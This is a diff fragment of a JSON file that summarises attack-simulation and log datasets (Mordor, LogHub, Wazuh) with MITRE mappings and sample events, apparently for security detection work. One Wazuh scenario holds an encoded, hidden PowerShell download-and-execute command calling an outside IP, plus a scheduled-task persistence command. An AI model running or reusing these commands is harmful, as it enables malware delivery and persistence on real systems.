+      "dataset_type": "mordor",
+      "total_events_analyzed": 122,
+      "suspicious_events_count": 116,
+      "dominant_event_ids": [
+        "10",
+        "13",
+        "7",
+        "5158",
+        "5156",
+        "11",
+        "12",
+        "9"
+      ],
+      "mitre_techniques": [
+        "T1037.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION",
+      "key_indicators": [
+        "explorer.exe",
+        "svchost.exe",
+        "reg.exe",
+        "windowsazureguestagent.exe",
+        "waappagent.exe",
+        "cmd.exe"
+      ],
+      "sample_commands": [
+        "The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0xC61D9",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestage",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestagent.exe Net",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3304 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\waappagent.exe Network Informat",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3304 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\waappagent.exe Network Information: Direc"
+      ]
+    },
+    {
+      "scenario_name": "Lateral Movement / WinRM WSMan Automation",
+      "source_file": "covenant_com_wsman_automation_2020-10-13002455.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 811,
+      "suspicious_events_count": 640,
+      "dominant_event_ids": [
+        "7",
+        "10",
+        "4658",
+        "5156",
+        "5158",
+        "4656",
+        "4690",
+        "4663"
+      ],
+      "mitre_techniques": [
+        "T1021.006"
+      ],
+      "attack_category": "LATERAL_MOVEMENT",
+      "key_indicators": [
+        "svchost.exe",
+        "grunthttp.exe",
+        "wmiprvse.exe",
+        "windowsazureguestagent.exe",
+        "conhost.exe",
+        "whoami.exe"
+      ],
+      "sample_commands": [
+        "Network connection detected: RuleName: - UtcTime: 2020-10-13 04:24:51.699 ProcessGuid: {029f9482-bfb1-5f84-5300-000000000400} ProcessId: 3712 Image: C:\\Windows\\System32\\dns.exe User: NT AUTHORITY\\SYSTEM Protocol: udp Initiated: false Source",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3544 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-12_203739\\waappagent.exe Network Informat",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3544 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-12_203739\\waappagent.exe Network Information: Direc",
+        "Registry object added or deleted: RuleName: - EventType: CreateKey UtcTime: 2020-10-13 04:24:55.086 ProcessGuid: {029f9482-bfb1-5f84-4e00-000000000400} ProcessId: 3632 Image: C:\\windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe TargetO",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3632 Application Name: \\device\\harddiskvolume2\\windows\\adws\\microsoft.activedirectory.webservices.exe Network Information: Source Addr"
+      ]
+    },
+    {
+      "scenario_name": "Lateral Movement / SMB Admin Share Copy",
+      "source_file": "covenant_copy_smb_CreateRequest_2020-09-22145302.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 506,
+      "suspicious_events_count": 496,
+      "dominant_event_ids": [
+        "12",
+        "10",
+        "13",
+        "5158",
+        "5156",
+        "11",
+        "4689",
+        "5"
+      ],
+      "mitre_techniques": [
+        "T1021.002"
+      ],
+      "attack_category": "LATERAL_MOVEMENT",
+      "key_indicators": [
+        "svchost.exe",
+        "lsass.exe",
+        "windowsazureguestagent.exe",
+        "officeclicktorun.exe",
+        "explorer.exe",
+        "waappagent.exe"
+      ],
+      "sample_commands": [
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3260 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150914\\guestagent\\windowsazureguestage",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3260 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150914\\guestagent\\windowsazureguestagent.exe Net",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3596 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150607\\guestagent\\windowsazureguestage",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3596 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150607\\guestagent\\windowsazureguestagent.exe Net",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3368 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150921\\waappagent.exe Network Informat"
+      ]
+    },
+    {
+      "scenario_name": "Persistence / Registry Run Keys Modification",
+      "source_file": "empire_persistence_registry_modification_run_keys_elevated_user_2020-07-22001847.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 657,
+      "suspicious_events_count": 608,
+      "dominant_event_ids": [
+        "5156",
+        "800",
+        "4658",
+        "4103",
+        "3",
+        "5158",
+        "4690",
+        "4656"
+      ],
+      "mitre_techniques": [
+        "T1547.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION",
+      "key_indicators": [
+        "powershell.exe",
+        "windowsazureguestagent.exe",
+        "svchost.exe",
+        "networkwatcheragent.exe",
+        "lsass.exe",
+        "dns.exe"
+      ],
+      "sample_commands": [
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3432 Application Name: \\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatc",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 704 Application Name: \\device\\harddiskvolume4\\windows\\system32\\lsass.exe Network Information: Direction: Inbound Source Address: fe80::6c96:34e3",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3484 Application Name: \\device\\harddiskvolume4\\windows\\system32\\dns.exe Network Information: Direction: Outbound Source Address: fe80::6c96:34e3",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3732 Application Name: \\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe Network Information: Direction: Outbo",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3484 Application Name: \\device\\harddiskvolume4\\windows\\system32\\dns.exe Network Information: Direction: Inbound Source Address: 172.18.38.6 Sour"
+      ]
+    },
+    {
+      "scenario_name": "Credential Access / GUI Input Capture (PowerShell PromptForCredential)",
+      "source_file": "psh_input_capture_promptforcreds_2020-10-2001320841.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 163,
+      "suspicious_events_count": 161,
+      "dominant_event_ids": [
+        "10",
+        "13",
+        "7",
+        "12",
+        "11",
+        "5158",
+        "5156",
+        "1102"
+      ],
+      "mitre_techniques": [
+        "T1056.002",
+        "T1059.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS",
+      "key_indicators": [
+        "explorer.exe",
+        "svchost.exe",
+        "powershell.exe",
+        "ctfmon.exe",
+        "windowsazureguestagent.exe",
+        "system"
+      ],
+      "sample_commands": [
+        "The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0xC61D9",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestage",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestagent.exe Net",
+        "File created: RuleName: - UtcTime: 2020-10-20 05:31:50.076 ProcessGuid: {39e4a257-f133-5f8b-1c00-000000000700} ProcessId: 1260 Image: C:\\windows\\System32\\svchost.exe TargetFilename: C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive0.dat Creat",
+        "Process accessed: RuleName: - UtcTime: 2020-10-20 05:31:50.669 SourceProcessGUID: {39e4a257-f132-5f8b-1000-000000000700} SourceProcessId: 944 SourceThreadId: 8524 SourceImage: C:\\windows\\system32\\svchost.exe TargetProcessGUID: {39e4a257-f1b"
+      ]
+    },
+    {
+      "scenario_name": "Execution / C2 HttpListener (PowerShell System.Net.HttpListener)",
+      "source_file": "psh_powershell_httplistener_2020-11-0204130683.json",
+      "dataset_type": "mordor",
+      "total_events_analyzed": 110,
+      "suspicious_events_count": 109,
+      "dominant_event_ids": [
+        "10",
+        "13",
+        "12",
+        "7",
+        "5158",
+        "1102",
+        "5156",
+        "5154"
+      ],
+      "mitre_techniques": [
+        "T1059.001",
+        "T1071.001"
+      ],
+      "attack_category": "MALWARE",
+      "key_indicators": [
+        "explorer.exe",
+        "svchost.exe",
+        "powershell.exe",
+        "system",
+        "windowsazureguestagent.exe",
+        "ctfmon.exe"
+      ],
+      "sample_commands": [
+        "The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0xC61D9",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestage",
+        "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 3428 Application Name: \\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-10-08_063613\\guestagent\\windowsazureguestagent.exe Net",
+        "The Windows Filtering Platform has permitted a bind to a local port. Application Information: Process ID: 4 Application Name: System Network Information: Source Address: :: Source Port: 8000 Protocol: 6 Filter Information: Filter Run-Time I",
+        "Process accessed: RuleName: - UtcTime: 2020-11-02 09:12:57.961 SourceProcessGUID: {39e4a257-f132-5f8b-1000-000000000700} SourceProcessId: 944 SourceThreadId: 1060 SourceImage: C:\\windows\\system32\\svchost.exe TargetProcessGUID: {39e4a257-f24"
+      ]
+    },
+    {
+      "scenario_name": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "source_file": "Apache_2k.log",
+      "dataset_type": "loghub",
+      "total_events_analyzed": 2000,
+      "suspicious_events_count": 595,
+      "dominant_event_ids": [
+        "WebLog"
+      ],
+      "mitre_techniques": [
+        "T1190",
+        "T1071.001"
+      ],
+      "attack_category": "WEB_ATTACK",
+      "key_indicators": [
+        "webserver"
+      ],
+      "sample_commands": [
+        "[Sun Dec 04 04:47:44 2005] [error] mod_jk child workerEnv in error state 6",
+        "[Sun Dec 04 04:51:18 2005] [error] mod_jk child workerEnv in error state 6",
+        "[Sun Dec 04 04:51:55 2005] [error] mod_jk child workerEnv in error state 6",
+        "[Sun Dec 04 04:52:15 2005] [error] mod_jk child workerEnv in error state 6",
+        "[Sun Dec 04 04:52:15 2005] [error] mod_jk child workerEnv in error state 7"
+      ]
+    },
+    {
+      "scenario_name": "Credential Access & Privilege Escalation / Linux Syslog & PAM Auth (LogHub)",
+      "source_file": "Linux_2k.log",
+      "dataset_type": "loghub",
+      "total_events_analyzed": 2000,
+      "suspicious_events_count": 612,
+      "dominant_event_ids": [
+        "LinuxSyslog-ftpd",
+        "LinuxSyslog-linux-daemon",
+        "LinuxSyslog-kernel",
+        "LinuxSyslog-klogind",
+        "LinuxSyslog-logrotate",
+        "LinuxSyslog-named",
+        "LinuxSyslog-cups",
+        "LinuxSyslog-udev"
+      ],
+      "mitre_techniques": [
+        "T1110",
+        "T1548.003",
+        "T1078"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION",
+      "key_indicators": [
+        "ftpd",
+        "linux-daemon",
+        "kernel",
+        "klogind",
+        "logrotate",
+        "named"
+      ],
+      "sample_commands": [
+        "Jun 14 15:16:01 combo sshd(pam_unix)[19939]: authentication failure; logname= uid=0 euid=0 tty=NODEVssh ruser= rhost=218.188.2.4",
+        "Jun 14 15:16:02 combo sshd(pam_unix)[19937]: check pass; user unknown",
+        "Jun 14 15:16:02 combo sshd(pam_unix)[19937]: authentication failure; logname= uid=0 euid=0 tty=NODEVssh ruser= rhost=218.188.2.4",
+        "Jun 15 02:04:59 combo sshd(pam_unix)[20882]: authentication failure; logname= uid=0 euid=0 tty=NODEVssh ruser= rhost=220-135-151-1.hinet-ip.hinet.net user=root",
+        "Jun 15 02:04:59 combo sshd(pam_unix)[20884]: authentication failure; logname= uid=0 euid=0 tty=NODEVssh ruser= rhost=220-135-151-1.hinet-ip.hinet.net user=root"
+      ]
+    },
+    {
+      "scenario_name": "Credential Access / OpenSSH Brute Force & Auth Failures (LogHub)",
+      "source_file": "OpenSSH_2k.log",
+      "dataset_type": "loghub",
+      "total_events_analyzed": 2000,
+      "suspicious_events_count": 1524,
+      "dominant_event_ids": [
+        "LinuxSyslog-sshd"
+      ],
+      "mitre_techniques": [
+        "T1110",
+        "T1078"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS",
+      "key_indicators": [
+        "sshd"
+      ],
+      "sample_commands": [
+        "Dec 10 06:55:46 LabSZ sshd[24200]: reverse mapping checking getaddrinfo for ns.marryaldkfaczcz.com [173.234.31.186] failed - POSSIBLE BREAK-IN ATTEMPT!",
+        "Dec 10 06:55:46 LabSZ sshd[24200]: Invalid user webmaster from 173.234.31.186",
+        "Dec 10 06:55:46 LabSZ sshd[24200]: input_userauth_request: invalid user webmaster [preauth]",
+        "Dec 10 06:55:46 LabSZ sshd[24200]: pam_unix(sshd:auth): check pass; user unknown",
+        "Dec 10 06:55:46 LabSZ sshd[24200]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=173.234.31.186"
+      ]
+    },
+    {
+      "scenario_name": "Wazuh Scenario (wazuh_alerts_scenario1_phishing.json)",
+      "source_file": "wazuh_alerts_scenario1_phishing.json",
+      "dataset_type": "wazuh_alerts",
+      "total_events_analyzed": 3,
+      "suspicious_events_count": 2,
+      "dominant_event_ids": [
+        "60105",
+        "60106",
+        "60115"
+      ],
+      "mitre_techniques": [
+        "T1110.003",
+        "T1078.002",
+        "T1078",
+        "T1087.002"
+      ],
+      "attack_category": "MALWARE",
+      "key_indicators": [],
+      "sample_commands": [
+        "Event 4625: An account failed to log on (Bad Password / Spray)",
+        "Event 4624: An account was successfully logged on",
+        "Event 4672/5379: Special privileges and credential access prompt (Mordor PID 8536)"
+      ]
+    },
+    {
+      "scenario_name": "Wazuh Scenario (wazuh_alerts_scenario2_malware.json)",
+      "source_file": "wazuh_alerts_scenario2_malware.json",
+      "dataset_type": "wazuh_alerts",
+      "total_events_analyzed": 4,
+      "suspicious_events_count": 4,
+      "dominant_event_ids": [
+        "92211",
+        "92215",
+        "92213",
+        "92218"
+      ],
+      "mitre_techniques": [
+        "T1059.001",
+        "T1027",
+        "T1105",
+        "T1071.001",
+        "T1053.005"
+      ],
+      "attack_category": "MALWARE",
+      "key_indicators": [
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "C:\\Windows\\System32\\schtasks.exe"
+      ],
+      "sample_commands": [
+        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEA",
+        "Sysmon Event 11: FileCreate: invoice_scan_v8.exe in Temp",
+        "Sysmon Event 3: Network connection detected to 194.26.29.112:443",
+        "schtasks /create /tn \"WindowsTelemetryUpdate\" /tr \"C:\\Users\\truongdo\\AppData\\Local\\Temp\\invoice_scan_v8.exe\" /sc onlogon"
+      ]
+    },
+    {
+      "scenario_name": "Wazuh Scenario (wazuh_alerts_scenario3_network_scan.json)",
+      "source_file": "wazuh_alerts_scenario3_network_scan.json",
+      "dataset_type": "wazuh_alerts",
+      "total_events_analyzed": 3,
+      "suspicious_events_count": 2,
+      "dominant_event_ids": [
+        "5712",
+        "5710",
+        "5715"
+      ],
+      "mitre_techniques": [
+        "T1018",
+        "T1046",
+        "T1595.002"
+      ],
+      "attack_category": "MALWARE",
+      "key_indicators": [],
+      "sample_commands": [
+        "Firewall block: ICMP sweep detected from 192.168.100.10 to subnet 192.168.1.0/24",
+        "Firewall block: multiple SYN dropped from 192.168.100.10 to 192.168.1.105 ports 445, 3389, 22",
+        "IDS Alert: Rapid probe payload detected on SMB 445 from 192.168.100.10"
+      ]
+    },
+    {
+      "scenario_name": "Wazuh Scenario (wazuh_alerts_scenario4_benign.json)",
+      "source_file": "wazuh_alerts_scenario4_benign.json",
+      "dataset_type": "wazuh_alerts",
+      "total_events_analyzed": 1,
+      "suspicious_events_count": 0,
+      "dominant_event_ids": [
+        "60100"
+      ],
+      "mitre_techniques": [],
+      "attack_category": "BENIGN",
+      "key_indicators": [],
+      "sample_commands": [
+        "Event 4624: An account was successfully logged on (Interactive Session)"
+      ]
+    }
+  ],
+  "knowledge_docs_ingested": [
+    {
+      "id": "SDAWS-200914011940",
+      "title": "AWS Cloud Bank Breach S3",
+      "source_file": "SDAWS-200914011940.yaml",
+      "mitre_techniques": [
+        "T1078.004",
+        "T1530"
+      ],
+      "tactics": [
+        "Initial Access",
+        "Persistence",
+        "Privilege Escalation",
+        "Defense Evasion",
+        "Collection"
+      ],
+      "description": "This dataset represents adversaries abusing a misconfigured EC2 reverse proxy to obtain instance profile keys and eventually exfiltrate files from an S3 bucket."
+    },
+    {
+      "id": "SDAWS-2202181000",
+      "title": "SDAWS-2202181000",
+      "source_file": "SDAWS-2202181000.yaml",
+      "mitre_techniques": [
+        "T1580"
+      ],
+      "tactics": [
+        "Discovery"
+      ],
+      "description": "This dataset represents adversaries trying to scan , discover and access open S3 honeybucket based on known hostname patterns. in this case honeybucket microsoft-devtest.s3.amazonaws.com."
+    },
+    {
+      "id": "SDLIN-201110074812",
+      "title": "Arp Cache Discovery",
+      "source_file": "SDLIN-201110074812.yaml",
+      "mitre_techniques": [
+        "T1018"
+      ],
+      "tactics": [
+        "Discovery"
+      ],
+      "description": "This dataset represents a threat actor using arp to list out the arp cache."
+    },
+    {
+      "id": "SDLIN-201110081941",
+      "title": "DD Binary Padding Hash Change",
+      "source_file": "SDLIN-201110081941.yaml",
+      "mitre_techniques": [
+        "T1027.001"
+      ],
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "description": "This dataset represents a threat actor using dd to add a zero to the binary to change the hash."
+    },
+    {
+      "id": "SDWIN-190301125905",
+      "title": "Empire Powerview Add-DomainObjectAcl",
+      "source_file": "SDWIN-190301125905.yaml",
+      "mitre_techniques": [
+        "T1222.001"
+      ],
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "description": "These datasets represent adversaries with enough permissions (i.e. domain admin) adding an access control entry (ACE) to the discretionary access control list (DACL) of an Active Directory object (i.e Root Domain). One example could be adversaries modifying the root domain DACL to allow a specific domain user, despite being in no privileged groups and not having local admin rights on the domain co"
+    },
+    {
+      "id": "SDWIN-190301174830",
+      "title": "Empire DCSync",
+      "source_file": "SDWIN-190301174830.yaml",
+      "mitre_techniques": [
+        "T1003.006"
+      ],
+      "tactics": [
+        "Credential Access"
+      ],
+      "description": "This dataset represents adversaries abusing Active Directory Replication services to retrieve secret domain data (i.e. NTLM hashes) from domain accounts."
+    },
+    {
+      "id": "SDWIN-190319020147",
+      "title": "Empire Net Local Administrators Group",
+      "source_file": "SDWIN-190319020147.yaml",
+      "mitre_techniques": [
+        "T1069.001"
+      ],
+      "tactics": [
+        "Discovery"
+      ],
+      "description": "This dataset represents adversaries enumerating members of the local Administratrors group via the net.exe utility"
+    },
+    {
+      "id": "SDWIN-190319020729",
+      "title": "Empire Net Local Users",
+      "source_file": "SDWIN-190319020729.yaml",
+      "mitre_techniques": [
+        "T1087.001"
+      ],
+      "tactics": [
+        "Discovery"
+      ],
+      "description": "This dataset represents adversaries enumerating all local users on an endpoint"
+    },
+    {
+      "id": "SDWIN-190319021158",
+      "title": "Empire Net Domain Users",
+      "source_file": "SDWIN-190319021158.yaml",
+      "mitre_techniques": [
+        "T1087.002"
+      ],
+      "tactics": [
+        "Discovery"
+      ],
+      "description": "This dataset represents adversaries enumerating all users that belong to a domain via RPC SAMR EnumDomainUsers."
+    },
+    {
+      "id": "SDWIN-190319023812",
+      "title": "Empire Userland Registry Run Keys",
+      "source_file": "SDWIN-190319023812.yaml",
+      "mitre_techniques": [
+        "T1547.001"
+      ],
+      "tactics": [
+        "Persistence"
+      ],
+      "description": "This dataset represents adversaries modifying local Run registry keys (i.e. HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) for persistence. It also captures the execution of the persistence mechanism."
+    },
+    {
+      "id": "SDWIN-190319024742",
+      "title": "Empire Userland Scheduled Tasks",
+      "source_file": "SDWIN-190319024742.yaml",
+      "mitre_techniques": [
+        "T1053.005"
+      ],
+      "tactics": [
+        "Persistence"
+      ],
+      "description": "This dataset represents adversaries creating and/or executing local scheduled tasks to maintain persistence in an environment."
+    },
+    {
+      "id": "SDWIN-190319131123",
+      "title": "Empire Over-Pass-The-Hash",
+      "source_file": "SDWIN-190319131123.yaml",
+      "mitre_techniques": [
+        "T1550.002"
+      ],
+      "tactics": [
+        "Defense Evasion",
+        "Lateral Movement"
+      ],
+      "description": "This dataset represents adversaries taking a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a fully-fledged Kerberos TGT. In this case, an adversary can write the hash/key into an existing logon session (i.e. a sacrificial logon session) section in the memory content of LSASS and kick off the regular Kerberos authentication process."
+    },
+    {
+      "id": "SDWIN-190319145126",
+      "title": "Rubeus Userland ASKTGT PTT",
+      "source_file": "SDWIN-190319145126.yaml",
+      "mitre_techniques": [
+        "T1003.003"
+      ],
+      "tactics": [
+        "Credential Access"
+      ],
+      "description": "This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs without touching lsass."
+    },
+    {
+      "id": "SDWIN-190403133337",
+      "title": "IKEEXT Remote Service DLL Hijack",
+      "source_file": "SDWIN-190403133337.yaml",
+      "mitre_techniques": [
+        "T1574.001"
+      ],
+      "tactics": [
+        "Persistence",
+        "Privilege Escalation",
+        "Defense Evasion"
+      ],
+      "description": "This dataset represents adversaries copying a file remotely to replace a file which is executed by a service that is vulnerable to DLL hijack. This dataset includes"
+    },
+    {
+      "id": "SDWIN-190518182022",
+      "title": "Empire VBS Execution",
+      "source_file": "SDWIN-190518182022.yaml",
+      "mitre_techniques": [
+        "T1059.005"
+      ],
+      "tactics": [
+        "Execution"
+      ],
+      "description": "This dataset represents adversaries executing a VBS script as a launcher for initial access."
+    },
+    {
+      "id": "SDWIN-190518184306",
+      "title": "Empire Elevated WMI Eventing",
+      "source_file": "SDWIN-190518184306.yaml",
+      "mitre_techniques": [
+        "T1546.003"
+      ],
+      "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+      ],
+      "description": "This dataset represents adversaries leveraging WMI subscriptions locally for persistence."
+    },
+    {
+      "id": "SDWIN-190518200432",
+      "title": "Empire PSInject",
+      "source_file": "SDWIN-190518200432.yaml",
+      "mitre_techniques": [
+        "T1055.003"
+      ],
+      "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+      ],
+      "description": "This dataset represents adversaries reflectively loading/intecting a portable executable (PE) (not on disk) into a process via WriteprocessMemory and executed via CreateRemoteThread APIs"
+    },
+    {
+      "id": "SDWIN-190518201207",
+      "title": "Empire Shell Net Domain Admins",
+      "source_file": "SDWIN-190518201207.yaml",
+      "mitre_techniques": [
+        "T1069.002"
+      ],
+      "tactics": [
+        "Discovery"
+      ],
+      "description": "This dataset represents adversaries enumerating members of domain groups (i.e. Domain Admins) via RPC SAMR interface over SMB. Some of the main RPC methods captured over the network are SamrLookupNamesInDomain (Opnum 17) and SamrQueryInformationGroup (Opnum 20) where there are indicators about the specific group name enumerated."
+    },
+    {
+      "id": "SDWIN-190518201922",
+      "title": "Empire WDigest Downgrade",
+      "source_file": "SDWIN-190518201922.yaml",
+      "mitre_techniques": [
+        "T1112"
+      ],
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "description": "This dataset represents adversaries setting the UseLogonCredential property value from HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest key to 1 to enable plain text passwords."
+    },
+    {
+      "id": "SDWIN-190518202151",
+      "title": "Empire Mimikatz LogonPasswords",
+      "source_file": "SDWIN-190518202151.yaml",
+      "mitre_techniques": [
+        "T1003.001"
+      ],
+      "tactics": [
+        "Credential Access"
+      ],
+      "description": "This dataset represents adversaries reading credentials from the memory contents of lsass.exe. One popular tool performing this behavior is Mimikatz."
+    }
+  ]
+}
